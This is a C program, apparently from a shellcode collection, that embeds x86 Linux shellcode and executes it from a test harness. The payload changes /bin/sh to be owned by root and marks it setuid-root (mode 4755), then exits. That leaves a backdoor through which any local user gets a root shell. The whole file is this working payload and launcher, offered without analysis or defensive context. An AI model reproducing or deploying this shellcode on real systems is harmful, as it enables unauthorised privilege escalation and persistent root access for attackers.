#include <stdio.h>
#include <string.h>
char *shellcode=
		"\xeb\x1f"                    /* jmp    0x8048081 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\xb6"                    /* mov    $0xb6,%al */
		"\x5b"                        /* pop    %ebx */
		"\x31\xc9"                    /* xor    %ecx,%ecx */
		"\x31\xd2"                    /* xor    %edx,%edx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x0f"                    /* mov    $0xf,%al */
		"\x89\xdb"                    /* mov    %ebx,%ebx */
		"\x66\xb9\xed\x09"            /* mov    $0x9ed,%cx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xdc\xff\xff\xff"        /* call   0x8048062 */
		"\x2f"                        /* das     */
		"\x62\x69\x6e"                /* bound  %ebp,0x6e(%ecx) */
		"\x2f"                        /* das     */
		"\x73\x68";                   /* jae    0x80480f5 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}
